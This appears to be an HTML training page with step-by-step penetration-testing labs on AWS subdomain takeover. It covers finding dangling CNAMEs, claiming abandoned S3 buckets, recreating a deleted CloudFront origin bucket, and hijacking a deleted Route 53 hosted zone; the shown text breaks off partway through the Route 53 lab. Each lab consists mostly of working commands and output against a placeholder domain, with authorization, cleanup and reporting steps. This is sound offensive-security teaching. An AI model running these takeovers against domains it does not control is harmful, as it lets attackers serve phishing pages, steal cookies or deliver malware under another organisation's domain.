@@ -1,0 +1,765 @@
+<div class="labs-container" id="m02-labs">
+
+  <!-- ============================================================ -->
+  <!-- LAB 1: Identifying Dangling DNS                              -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M02-L01-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Find dangling CNAME records pointing to deprovisioned AWS services that are vulnerable to subdomain takeover.
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>Tools installed: <code>subfinder</code>, <code>dnsx</code>, <code>subjack</code>, <code>nuclei</code> (with takeover templates)</li>
+        <li>Go 1.21+ (required for subfinder, dnsx, subjack, nuclei)</li>
+        <li>Install subjack: <code>go install github.com/haccer/subjack@latest</code></li>
+        <li>Download subjack fingerprints file (required &mdash; see Step 4)</li>
+        <li>Target domain within authorized engagement scope (e.g., <code>targetcorp.com</code>)</li>
+        <li>DNS resolution working from your attacker machine</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Enumerate subdomains with <strong>subfinder</strong> to build a comprehensive target list.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ subfinder -d targetcorp.com -o subs.txt</div>
+              <div class="terminal-output">               __    _____           __
+   _______  __/ /_  / __(_)___  ____/ /__  _____
+  / ___/ / / / __ \/ /_/ / __ \/ __  / _ \/ ___/
+ (__  ) /_/ / /_/ / __/ / / / / /_/ /  __/ /
+/____/\__,_/_.___/_/ /_/_/ /_/\__,_/\___/_/
+
+[INF] Found 23 subdomains for targetcorp.com
+
+www.targetcorp.com
+api.targetcorp.com
+mail.targetcorp.com
+assets.targetcorp.com
+cdn.targetcorp.com
+staging.targetcorp.com
+dev.targetcorp.com
+blog.targetcorp.com
+app.targetcorp.com
+portal.targetcorp.com
+help.targetcorp.com
+status.targetcorp.com
+docs.targetcorp.com
+legacy-app.targetcorp.com
+beta.targetcorp.com
+...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Resolve CNAME records for all subdomains using <strong>dnsx</strong> to identify where each points.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ cat subs.txt | dnsx -cname -o cnames.txt</div>
+              <div class="terminal-output">www.targetcorp.com [d111111abcdef8.cloudfront.net.]
+assets.targetcorp.com [assets.targetcorp.com.s3.amazonaws.com.]
+cdn.targetcorp.com [d222222ghijkl9.cloudfront.net.]
+staging.targetcorp.com [targetcorp-staging.s3-website-us-east-1.amazonaws.com.]
+blog.targetcorp.com [targetcorp.ghost.io.]
+help.targetcorp.com [targetcorp.zendesk.com.]
+legacy-app.targetcorp.com [targetcorp-legacy.us-east-1.elasticbeanstalk.com.]
+beta.targetcorp.com [targetcorp-beta.herokuapp.com.]
+docs.targetcorp.com [targetcorp.readme.io.]</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Filter results for AWS-specific services that are commonly vulnerable to takeover.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ grep -E 's3\.amazonaws|s3-website|cloudfront\.net|elasticbeanstalk\.com|elb\.amazonaws' cnames.txt</div>
+              <div class="terminal-output">assets.targetcorp.com [assets.targetcorp.com.s3.amazonaws.com.]
+cdn.targetcorp.com [d222222ghijkl9.cloudfront.net.]
+staging.targetcorp.com [targetcorp-staging.s3-website-us-east-1.amazonaws.com.]
+legacy-app.targetcorp.com [targetcorp-legacy.us-east-1.elasticbeanstalk.com.]</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Run <strong>subjack</strong> to automatically detect dangling CNAMEs. subjack requires a fingerprints file that maps service providers to their takeover signatures &mdash; download it before running the scan.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Download the required fingerprints file first</div>
+              <div class="terminal-cmd">$ wget https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json</div>
+              <div class="terminal-output">--2024-03-16 14:00:00--  https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json
+Resolving raw.githubusercontent.com... 185.199.108.133
+HTTP request sent, awaiting response... 200 OK
+Length: 18432 (18K) [application/json]
+Saving to: 'fingerprints.json'
+
+fingerprints.json   100%[===================>]  18.00K  --.-KB/s    in 0.1s
+
+2024-03-16 14:00:00 (180 KB/s) - 'fingerprints.json' saved [18432/18432]</div>
+              <div class="terminal-cmd"># Run subjack with the fingerprints file (-m flag) and -a to check all subdomains</div>
+              <div class="terminal-cmd">$ subjack -w subs.txt -t 100 -timeout 30 -o takeovers.txt -ssl -a -m fingerprints.json</div>
+              <div class="terminal-output">[VULNERABLE] assets.targetcorp.com — Provider: aws/s3 — CNAME: assets.targetcorp.com.s3.amazonaws.com
+[VULNERABLE] staging.targetcorp.com — Provider: aws/s3 — CNAME: targetcorp-staging.s3-website-us-east-1.amazonaws.com
+[NOT VULNERABLE] cdn.targetcorp.com — Provider: aws/cloudfront — CNAME: d222222ghijkl9.cloudfront.net
+[VULNERABLE] legacy-app.targetcorp.com — Provider: aws/elasticbeanstalk — CNAME: targetcorp-legacy.us-east-1.elasticbeanstalk.com</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Validate findings with <strong>nuclei</strong> using subdomain takeover templates for high-confidence results.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ nuclei -l subs.txt -t takeovers/ -o vuln.txt</div>
+              <div class="terminal-output">                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/
+
+[INF] Loading templates...
+[INF] [aws-bucket-takeover] assets.targetcorp.com
+[INF] [aws-bucket-takeover] staging.targetcorp.com
+[INF] [elasticbeanstalk-takeover] legacy-app.targetcorp.com
+
+Found 3 results in 12.4s</div>
+              <div class="terminal-cmd">$ cat vuln.txt</div>
+              <div class="terminal-output">[aws-bucket-takeover] [http] [high] assets.targetcorp.com
+[aws-bucket-takeover] [http] [high] staging.targetcorp.com
+[elasticbeanstalk-takeover] [http] [high] legacy-app.targetcorp.com</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">subfinder</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">dnsx CNAME</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Filter AWS</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">subjack / nuclei</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Takeover Candidates</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-circle-info"></i>
+      A "dangling" CNAME exists when a DNS record points to a resource that no longer exists. The subdomain still resolves, but the destination is unclaimed &mdash; meaning an attacker can create the resource and serve content under the target's domain.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong> This lab is passive enumeration only &mdash; no AWS resources were created. Delete local output files: <code>rm subs.txt cnames.txt takeovers.txt vuln.txt fingerprints.json</code>
+    </div>
+  </div>
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 2: Claiming Abandoned S3 Buckets                         -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M02-L02-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Take over a subdomain by claiming the abandoned S3 bucket its CNAME record still points to.
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>AWS CLI v2 installed and configured with an attacker-controlled AWS account</li>
+        <li>Dangling S3 CNAME identified from Lab 1 (e.g., <code>assets.targetcorp.com</code> &rarr; <code>assets.targetcorp.com.s3.amazonaws.com</code>)</li>
+        <li>The target DNS CNAME uses the virtual-hosted-style naming pattern where the bucket name matches the subdomain exactly</li>
+        <li>Authorized engagement scope confirming subdomain takeover testing is permitted</li>
+        <li>Note: This technique requires creating a bucket in your own AWS account. AWS account creation requires a valid payment method.</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Verify the CNAME is dangling &mdash; DNS resolves to S3, but the bucket no longer exists. The <code>NoSuchBucket</code> XML error from S3 is the definitive confirmation.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ dig +short assets.targetcorp.com</div>
+              <div class="terminal-output">assets.targetcorp.com.s3.amazonaws.com.
+52.217.44.100</div>
+              <div class="terminal-cmd">$ curl -s -o /dev/null -w "%{http_code}" http://assets.targetcorp.com</div>
+              <div class="terminal-output">404</div>
+              <div class="terminal-cmd">$ curl -s http://assets.targetcorp.com</div>
+              <div class="terminal-output">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;Error&gt;
+  &lt;Code&gt;NoSuchBucket&lt;/Code&gt;
+  &lt;Message&gt;The specified bucket does not exist&lt;/Message&gt;
+  &lt;BucketName&gt;assets.targetcorp.com&lt;/BucketName&gt;
+&lt;/Error&gt;</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Create an S3 bucket with the exact name the CNAME points to. The bucket name must match the CNAME target precisely. Specify the correct region &mdash; for virtual-hosted-style CNAMEs the bucket must be created in the region that matches the DNS endpoint.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws s3 mb s3://assets.targetcorp.com --region us-east-1</div>
+              <div class="terminal-output">make_bucket: assets.targetcorp.com</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Upload a proof-of-concept page to demonstrate control over the subdomain. Keep the content clearly marked as a security assessment PoC.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ cat &lt;&lt;'EOF' > index.html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Security Assessment - Subdomain Takeover PoC&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Subdomain Takeover PoC&lt;/h1&gt;
+  &lt;p&gt;This page is served from an attacker-controlled S3 bucket.&lt;/p&gt;
+  &lt;p&gt;Domain: assets.targetcorp.com&lt;/p&gt;
+  &lt;p&gt;Assessment Date: 2024-03-16&lt;/p&gt;
+  &lt;p&gt;Assessor: [Your Name]&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+EOF</div>
+              <div class="terminal-cmd">$ aws s3 cp index.html s3://assets.targetcorp.com/ --acl public-read</div>
+              <div class="terminal-output">upload: ./index.html to s3://assets.targetcorp.com/index.html</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Enable S3 static website hosting so the bucket serves HTTP content at the target subdomain.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws s3 website s3://assets.targetcorp.com/ --index-document index.html</div>
+              <div class="terminal-cmd"># Verify static hosting is enabled</div>
+              <div class="terminal-cmd">$ aws s3api get-bucket-website --bucket assets.targetcorp.com</div>
+              <div class="terminal-output">{
+    "IndexDocument": {
+        "Suffix": "index.html"
+    }
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Verify the takeover &mdash; the target's subdomain now serves your content from your attacker-controlled bucket.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ curl http://assets.targetcorp.com</div>
+              <div class="terminal-output">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Security Assessment - Subdomain Takeover PoC&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Subdomain Takeover PoC&lt;/h1&gt;
+  &lt;p&gt;This page is served from an attacker-controlled S3 bucket.&lt;/p&gt;
+  &lt;p&gt;Domain: assets.targetcorp.com&lt;/p&gt;
+  &lt;p&gt;Assessment Date: 2024-03-16&lt;/p&gt;
+  &lt;p&gt;Assessor: [Your Name]&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;</div>
+              <div class="terminal-cmd"># Take a screenshot for the report, then clean up immediately</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">Dangling CNAME</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">NoSuchBucket</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Create Bucket</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Upload PoC</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Enable Hosting</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Subdomain Owned</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-triangle-exclamation"></i>
+      <strong>Document and report immediately. Remove your bucket after verification.</strong> A real attacker could use this to serve phishing pages, steal cookies via same-origin policy abuse, or deliver malware &mdash; all under the target's trusted domain.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong>
+      <ol>
+        <li>Remove all objects from the bucket: <code>aws s3 rm s3://assets.targetcorp.com --recursive</code></li>
+        <li>Delete the bucket: <code>aws s3 rb s3://assets.targetcorp.com --force</code></li>
+        <li>Verify deletion: <code>aws s3 ls s3://assets.targetcorp.com</code> (should return an error)</li>
+        <li>Delete local PoC file: <code>rm index.html</code></li>
+        <li>Report the finding to the client immediately so they can remove the dangling CNAME record</li>
+      </ol>
+    </div>
+  </div>
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 3: CloudFront S3 Origin Misconfiguration Takeover        -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M02-L03-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Take over a CloudFront distribution that points to an unclaimed (deleted) S3 bucket as its origin, allowing an attacker to serve arbitrary content through the target's CloudFront distribution.
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>AWS CLI v2 installed and configured with an attacker-controlled AWS account</li>
+        <li>A CloudFront distribution identified whose S3 origin bucket has been deleted (the distribution still exists and the CNAME alias is still live, but the origin bucket does not)</li>
+        <li>The existing CloudFront distribution's origin domain name (e.g., <code>targetcorp-cdn-assets.s3.amazonaws.com</code>)</li>
+        <li>Authorized engagement scope confirming CloudFront/S3 testing is permitted</li>
+        <li>Note: This technique exploits a misconfiguration on the <em>existing</em> CloudFront distribution, not a new distribution creation. It does not require domain validation bypass.</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Identify a CloudFront distribution whose S3 origin bucket has been deleted. The distribution is still active and serving requests, but the origin returns <code>NoSuchBucket</code>.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ dig +short cdn.targetcorp.com</div>
+              <div class="terminal-output">d111111abcdef8.cloudfront.net.
+13.35.22.187</div>
+              <div class="terminal-cmd"># Check the response — a 403 from CloudFront or a proxied NoSuchBucket from S3 both indicate a potentially exploitable origin</div>
+              <div class="terminal-cmd">$ curl -sI https://cdn.targetcorp.com</div>
+              <div class="terminal-output">HTTP/2 403
+server: CloudFront
+x-cache: Error from cloudfront
+via: 1.1 abc123.cloudfront.net (CloudFront)
+x-amz-cf-id: XXXXXX</div>
+              <div class="terminal-cmd"># Probe the origin directly to confirm the S3 bucket is gone</div>
+              <div class="terminal-cmd">$ curl -s "https://targetcorp-cdn-assets.s3.amazonaws.com/"</div>
+              <div class="terminal-output">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;Error&gt;
+  &lt;Code&gt;NoSuchBucket&lt;/Code&gt;
+  &lt;Message&gt;The specified bucket does not exist&lt;/Message&gt;
+  &lt;BucketName&gt;targetcorp-cdn-assets&lt;/BucketName&gt;
+&lt;/Error&gt;</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Claim the deleted S3 bucket by recreating it in your attacker-controlled AWS account. The bucket name must exactly match the origin bucket name the existing CloudFront distribution is configured to use.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Create the bucket with the same name as the deleted origin bucket</div>
+              <div class="terminal-cmd">$ aws s3 mb s3://targetcorp-cdn-assets --region us-east-1</div>
+              <div class="terminal-output">make_bucket: targetcorp-cdn-assets</div>
+              <div class="terminal-cmd"># Disable Block Public Access so we can upload a public PoC</div>
+              <div class="terminal-cmd">$ aws s3api put-public-access-block \
+  --bucket targetcorp-cdn-assets \
+  --public-access-block-configuration "BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false"</div>
+              <div class="terminal-output">(no output on success)</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Upload a proof-of-concept HTML file to the reclaimed bucket and make it publicly readable.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ cat &lt;&lt;'EOF' > index.html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;CloudFront S3 Origin Takeover PoC&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;CloudFront S3 Origin Misconfiguration PoC&lt;/h1&gt;
+  &lt;p&gt;Domain: cdn.targetcorp.com&lt;/p&gt;
+  &lt;p&gt;Content served from attacker-controlled S3 bucket via existing CloudFront distribution.&lt;/p&gt;
+  &lt;p&gt;Assessment Date: 2024-03-16&lt;/p&gt;
+  &lt;p&gt;Assessor: [Your Name]&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+EOF</div>
+              <div class="terminal-cmd">$ aws s3 cp index.html s3://targetcorp-cdn-assets/ --acl public-read</div>
+              <div class="terminal-output">upload: ./index.html to s3://targetcorp-cdn-assets/index.html</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Apply a bucket policy to allow public read access from any principal (required for CloudFront to serve the content without an OAC/OAI).</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ cat &lt;&lt;'EOF' > bucket-policy.json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Sid": "PublicRead",
+      "Effect": "Allow",
+      "Principal": "*",
+      "Action": "s3:GetObject",
+      "Resource": "arn:aws:s3:::targetcorp-cdn-assets/*"
+    }
+  ]
+}
+EOF</div>
+              <div class="terminal-cmd">$ aws s3api put-bucket-policy \
+  --bucket targetcorp-cdn-assets \
+  --policy file://bucket-policy.json</div>
+              <div class="terminal-output">(no output on success)</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Verify the takeover &mdash; the existing CloudFront distribution now fetches content from your bucket and serves it at the target's CDN subdomain. Allow a few minutes for CloudFront's cache to refresh.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ curl https://cdn.targetcorp.com/index.html</div>
+              <div class="terminal-output">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;CloudFront S3 Origin Takeover PoC&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;CloudFront S3 Origin Misconfiguration PoC&lt;/h1&gt;
+  &lt;p&gt;Domain: cdn.targetcorp.com&lt;/p&gt;
+  &lt;p&gt;Content served from attacker-controlled S3 bucket via existing CloudFront distribution.&lt;/p&gt;
+  &lt;p&gt;Assessment Date: 2024-03-16&lt;/p&gt;
+  &lt;p&gt;Assessor: [Your Name]&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;</div>
+              <div class="terminal-cmd">$ curl -sI https://cdn.targetcorp.com/index.html | grep -i 'x-cache\|server'</div>
+              <div class="terminal-output">server: CloudFront
+x-cache: Hit from cloudfront</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">CF Distribution Exists</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Origin Bucket Deleted</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Reclaim Bucket</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Upload PoC</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">CDN Subdomain Owned</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-circle-info"></i>
+      This technique exploits a CloudFront distribution whose S3 origin bucket was deleted but the distribution itself was not. Because the distribution still exists and serves requests, and any AWS account can create a bucket with the same name, an attacker who reclaims the bucket name now controls the content served by the target's own distribution. This is distinct from a new-distribution CNAME alias attack. Modern CloudFront distributions using Origin Access Control (OAC) are not vulnerable to this specific variant because OAC ties the origin to a specific account.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong>
+      <ol>
+        <li>Remove all objects: <code>aws s3 rm s3://targetcorp-cdn-assets --recursive</code></li>
+        <li>Delete the bucket: <code>aws s3 rb s3://targetcorp-cdn-assets --force</code></li>
+        <li>Delete local files: <code>rm index.html bucket-policy.json</code></li>
+        <li>Report the finding to the client so they can delete or reconfigure the CloudFront distribution to point to a new, controlled origin bucket</li>
+      </ol>
+    </div>
+  </div>
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 4: Route 53 Hosted Zone Hijack                           -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M02-L04-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Hijack DNS for a domain whose Route 53 hosted zone has been deleted but whose NS delegation records at the registrar still point to Route 53 nameservers.
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>AWS CLI v2 installed and configured with an attacker-controlled AWS account</li>
+        <li>Tools installed: <code>dig</code></li>
+        <li>Target domain confirmed to have NS records pointing to Route 53 nameservers (<code>awsdns-*</code>) at the registrar level</li>
+        <li>Authorized scope confirmed &mdash; this attack requires active zone creation in your AWS account</li>
+        <li>Understanding of the low probability: Route 53 has approximately 2,000 distinct NS delegation sets. The chance of receiving the exact matching set on a given attempt is roughly 0.05%. Automated looping is required in practice.</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Check the NS records for the target domain at the registrar level. If they delegate to Route 53 nameservers (<code>awsdns-*</code>), the hosted zone may have been deleted while the registrar delegation was left intact.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ dig NS abandoned-target.com</div>
+              <div class="terminal-output">;; ANSWER SECTION:
+abandoned-target.com.   86400   IN   NS   ns-1234.awsdns-56.org.
+abandoned-target.com.   86400   IN   NS   ns-789.awsdns-01.net.
+abandoned-target.com.   86400   IN   NS   ns-456.awsdns-78.co.uk.
+abandoned-target.com.   86400   IN   NS   ns-321.awsdns-90.com.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Confirm the hosted zone no longer exists by querying the specific Route 53 nameservers directly. A <code>SERVFAIL</code> response means the authoritative nameserver failed to return a valid answer &mdash; this happens when the hosted zone has been deleted from Route 53 while the NS records remain at the registrar. This is the condition we will exploit.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ dig A www.abandoned-target.com @ns-1234.awsdns-56.org</div>
+              <div class="terminal-output">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: SERVFAIL, id: 45678
+;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0</div>
+              <div class="terminal-cmd">$ dig A admin.abandoned-target.com @ns-789.awsdns-01.net</div>
+              <div class="terminal-output">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: SERVFAIL, id: 12345
+;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0</div>
+              <div class="terminal-cmd"># SERVFAIL from the authoritative Route 53 nameserver confirms no hosted zone exists for this domain.
+# This means a resolver cannot get an authoritative answer — the condition we need to exploit.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Create a new hosted zone for the target domain in your attacker-controlled AWS account. Route 53 assigns a random delegation set from its pool of ~2,000 NS sets. You need to receive the exact same four nameservers the registrar is currently delegating to. If you don't match, delete the zone and try again.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws route53 create-hosted-zone \
+  --name abandoned-target.com \
+  --caller-reference $(date +%s)</div>
+              <div class="terminal-output">{
+    "HostedZone": {
+        "Id": "/hostedzone/Z0123456789ABC",
+        "Name": "abandoned-target.com.",
+        "CallerReference": "1710600000"
+    },
+    "DelegationSet": {
+        "NameServers": [
+            "ns-1234.awsdns-56.org",
+            "ns-789.awsdns-01.net",
+            "ns-456.awsdns-78.co.uk",
+            "ns-321.awsdns-90.com"
+        ]
+    }
+}</div>
+              <div class="terminal-cmd"># Compare assigned NS records against the registrar delegation NS records from Step 1.
+# If they match — proceed. If not, delete this zone and create a new one.
+# aws route53 delete-hosted-zone --id Z0123456789ABC</div>
